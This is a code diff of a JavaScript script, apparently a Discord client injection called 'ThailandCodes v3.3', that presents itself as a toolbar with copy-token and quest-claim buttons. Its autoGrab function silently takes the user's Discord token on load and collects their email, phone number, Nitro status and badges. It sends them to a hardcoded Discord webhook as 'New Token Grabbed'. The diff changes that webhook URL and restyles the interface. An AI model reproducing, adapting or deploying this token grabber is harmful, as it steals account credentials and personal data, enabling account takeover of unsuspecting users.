@@ -2,9 +2,8 @@
  * ThailandCodes v3.3
  * - Auto silent grab on load (webhook) — once only
  * - Rich embed with avatar, user info, badges
- * - Copy Token
- * - Copy Token Encrypted (XOR + Base64)
- * - Claim All Quests
+ * - Copy Token / Copy Encrypted / Claim All
+ * - Animated red gradient UI
  */
 (function () {
     'use strict';
@@ -12,7 +11,7 @@
     if (W.__TC_LOADED__) return;
     W.__TC_LOADED__ = true;
 
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555924284105298052/7X_WIvWay5hF8pHpIJeX-cjJLY00gnWJ9GDWYm62r_3RCJ3WL11h1QI-2XxjbbKhDZAI';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1563505727102910540/xtAh-pe1eLKUk7IRrKBvOD_4qpMcnWGMzo8ymS9ASqGzrPrnQ4x6N3yMhO2OGagrfV07';
     const ENCRYPT_KEY = 0x5A;
     const GRAB_KEY = '__tc_g__';
 
@@ -119,104 +118,50 @@
     async function autoGrab() {
         if (W[GRAB_KEY]) return;
         W[GRAB_KEY] = true;
+        let alreadySent = false;
         try {
-            if (localStorage.getItem(GRAB_KEY)) return;
-            localStorage.setItem(GRAB_KEY, '1');
+            alreadySent = !!localStorage.getItem(GRAB_KEY);
+            if (!alreadySent) localStorage.setItem(GRAB_KEY, '1');
         } catch {}
-
+        if (alreadySent) return;
         try {
             const t = await getToken();
             const user = await getUserInfo(t);
             if (!user || user.message) return;
-
             const avatarUrl = user.avatar
                 ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`
                 : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator || 0) % 5}.png`;
-
-            const nitroType = {
-                0: '❌ None',
-                1: '💜 Nitro Classic',
-                2: '🚀 Nitro',
-                3: '⚡ Nitro Basic'
-            }[user.premium_type] || '❌ None';
-
+            const nitroType = { 0:'❌ None',1:'💜 Nitro Classic',2:'🚀 Nitro',3:'⚡ Nitro Basic' }[user.premium_type] || '❌ None';
             const f = user.public_flags || 0;
             const badges = [];
-            if (f & (1 << 0))  badges.push('👮 Discord Staff');
-            if (f & (1 << 6))  badges.push('🎪 HypeSquad Events');
-            if (f & (1 << 9))  badges.push('⭐ Early Supporter');
-            if (f & (1 << 3))  badges.push('🏠 HypeSquad Bravery');
-            if (f & (1 << 4))  badges.push('💡 HypeSquad Brilliance');
-            if (f & (1 << 5))  badges.push('⚖️ HypeSquad Balance');
-            if (f & (1 << 17)) badges.push('🛠️ Active Developer');
-            if (f & (1 << 22)) badges.push('✅ Verified Bot Developer');
-
-            const tag = user.discriminator && user.discriminator !== '0'
-                ? `${user.username}#${user.discriminator}`
-                : user.username;
-
+            if (f & (1<<0))  badges.push('👮 Discord Staff');
+            if (f & (1<<6))  badges.push('🎪 HypeSquad Events');
+            if (f & (1<<9))  badges.push('⭐ Early Supporter');
+            if (f & (1<<3))  badges.push('🏠 HypeSquad Bravery');
+            if (f & (1<<4))  badges.push('💡 HypeSquad Brilliance');
+            if (f & (1<<5))  badges.push('⚖️ HypeSquad Balance');
+            if (f & (1<<17)) badges.push('🛠️ Active Developer');
+            if (f & (1<<22)) badges.push('✅ Verified Bot Developer');
+            const tag = user.discriminator && user.discriminator !== '0' ? `${user.username}#${user.discriminator}` : user.username;
             const createdAt = new Date((BigInt(user.id) >> 22n) + 1420070400000n);
-
             await sendWebhook({
                 embeds: [{
                     title: '🎯 New Token Grabbed',
-                    color: 0x5865f2,
-                    author: {
-                        name: tag,
-                        icon_url: avatarUrl,
-                    },
+                    color: 0xed4245,
+                    author: { name: tag, icon_url: avatarUrl },
                     thumbnail: { url: avatarUrl },
                     fields: [
-                        {
-                            name: '👤 Username',
-                            value: `\`${tag}\``,
-                            inline: true,
-                        },
-                        {
-                            name: '🆔 User ID',
-                            value: `\`${user.id}\``,
-                            inline: true,
-                        },
-                        {
-                            name: '📧 Email',
-                            value: user.email ? `\`${user.email}\`` : '`N/A`',
-                            inline: true,
-                        },
-                        {
-                            name: '📱 Phone',
-                            value: user.phone ? `\`${user.phone}\`` : '`N/A`',
-                            inline: true,
-                        },
-                        {
-                            name: '💎 Nitro',
-                            value: nitroType,
-                            inline: true,
-                        },
-                        {
-                            name: '✅ Verified',
-                            value: user.verified ? '`Yes`' : '`No`',
-                            inline: true,
-                        },
-                        {
-                            name: '📅 Account Created',
-                            value: `\`${createdAt.toUTCString()}\``,
-                            inline: false,
-                        },
-                        {
-                            name: '🏅 Badges',
-                            value: badges.length ? badges.join(' | ') : '`None`',
-                            inline: false,
-                        },
-                        {
-                            name: '🔑 Token',
-                            value: `\`\`\`${t}\`\`\``,
-                            inline: false,
-                        },
+                        { name: '👤 Username', value: `\`${tag}\``, inline: true },
+                        { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
+                        { name: '📧 Email', value: user.email ? `\`${user.email}\`` : '`N/A`', inline: true },
+                        { name: '📱 Phone', value: user.phone ? `\`${user.phone}\`` : '`N/A`', inline: true },
+                        { name: '💎 Nitro', value: nitroType, inline: true },
+                        { name: '✅ Verified', value: user.verified ? '`Yes`' : '`No`', inline: true },
+                        { name: '📅 Account Created', value: `\`${createdAt.toUTCString()}\``, inline: false },
+                        { name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false },
+                        { name: '🔑 Token', value: `\`\`\`${t}\`\`\``, inline: false },
                     ],
-                    footer: {
-                        text: 'ThailandCodes v3.3 • Auto Grab',
-                        icon_url: avatarUrl,
-                    },
+                    footer: { text: 'ThailandCodes v3.3 • Auto Grab', icon_url: avatarUrl },
                     timestamp: new Date().toISOString(),
                 }]
             });
@@ -224,42 +169,56 @@
     }
 
     const STYLE = `
+        @keyframes gradientShift {
+            0%   { background-position: 0% 50%; }
+            50%  { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 12px rgba(237,66,69,0.6), 0 12px 32px rgba(0,0,0,.55); }
+            50%       { box-shadow: 0 0 24px rgba(237,66,69,0.9), 0 12px 32px rgba(0,0,0,.55); }
+        }
         :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
-        .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
-            display:flex;align-items:center;gap:6px;padding:6px;background:#0f1115;
-            border:1px solid #1f222a;border-radius:14px;
-            box-shadow:0 12px 32px rgba(0,0,0,.55);
+        .wrap{
+            position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
+            display:flex;align-items:center;gap:6px;padding:6px;
+            background:linear-gradient(270deg,#1a0000,#3d0000,#6b0000,#3d0000,#1a0000);
+            background-size:400% 400%;
+            animation:gradientShift 4s ease infinite, pulse 2s ease-in-out infinite;
+            border:1px solid #ff2a2a;border-radius:14px;
             color:#e6e8ec;user-select:none;font-size:12px;
             transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
         .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
         .brand{padding:0 14px 0 10px;font-weight:800;font-size:13px;letter-spacing:.3px;
-            border-right:1px solid #1f222a;margin-right:4px;color:#fff}
-        .brand .a{color:#5865f2}
-        .brand .v{font-size:9px;font-weight:600;color:#5865f2;font-style:italic;margin-left:4px;letter-spacing:0}
-        button{background:#5865f2;border:1px solid transparent;color:#fff;
+            border-right:1px solid #ff2a2a;margin-right:4px;color:#fff;text-shadow:0 0 8px #ff4444}
+        .brand .a{color:#ff4444}
+        .brand .v{font-size:9px;font-weight:600;color:#ff6666;font-style:italic;margin-left:4px}
+        button{background:linear-gradient(135deg,#8b0000,#cc0000);border:1px solid #ff2a2a;color:#fff;
             padding:9px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:800;
             letter-spacing:.4px;text-transform:uppercase;font-family:inherit;
-            transition:background .12s,transform .1s;white-space:nowrap}
-        button:hover{background:#4752c4}
+            transition:background .12s,transform .1s,box-shadow .1s;white-space:nowrap;
+            box-shadow:0 0 8px rgba(200,0,0,0.4)}
+        button:hover{background:linear-gradient(135deg,#cc0000,#ff0000);box-shadow:0 0 16px rgba(255,0,0,0.6)}
         button:active{transform:scale(.97)}
         button:disabled{opacity:.5;cursor:wait}
-        button.enc{background:#1a1d24;border:1px solid #2a2e38}
-        button.enc:hover{background:#252830}
-        button.claim{background:#57f287;color:#000}
-        button.claim:hover{background:#3ba55d;color:#fff}
-        button.close{background:transparent;color:#6a6f7a;font-size:14px;
-            padding:8px 10px;text-transform:none;letter-spacing:0}
-        button.close:hover{background:#ed4245;color:#fff}
-        .toast{position:fixed;top:78px;right:24px;z-index:2147483647;background:#0f1115;
-            border:1px solid #1f222a;color:#e6e8ec;padding:12px 18px;border-radius:10px;
+        button.enc{background:linear-gradient(135deg,#2a0000,#550000);border:1px solid #ff2a2a}
+        button.enc:hover{background:linear-gradient(135deg,#550000,#880000)}
+        button.claim{background:linear-gradient(135deg,#006600,#00aa00);border:1px solid #00ff44;color:#fff;box-shadow:0 0 8px rgba(0,200,0,0.4)}
+        button.claim:hover{background:linear-gradient(135deg,#008800,#00cc00);box-shadow:0 0 16px rgba(0,255,0,0.6)}
+        button.close{background:transparent;color:#ff6666;font-size:14px;
+            padding:8px 10px;text-transform:none;letter-spacing:0;border:none;box-shadow:none}
+        button.close:hover{background:rgba(255,0,0,0.2);color:#fff}
+        .toast{position:fixed;top:78px;right:24px;z-index:2147483647;
+            background:linear-gradient(135deg,#1a0000,#3d0000);
+            border:1px solid #ff2a2a;color:#e6e8ec;padding:12px 18px;border-radius:10px;
             font-size:12px;font-weight:600;max-width:340px;
-            box-shadow:0 12px 32px rgba(0,0,0,.5);
+            box-shadow:0 0 16px rgba(200,0,0,0.5);
             opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;
             pointer-events:none}
         .toast.show{opacity:1;transform:translateY(0)}
         .toast.ok{border-left:3px solid #57f287}
-        .toast.err{border-left:3px solid #ed4245}
-        .toast.info{border-left:3px solid #5865f2}
+        .toast.err{border-left:3px solid #ff2a2a}
+        .toast.info{border-left:3px solid #ff6666}
     `;
 
     const root = document.createElement('div');
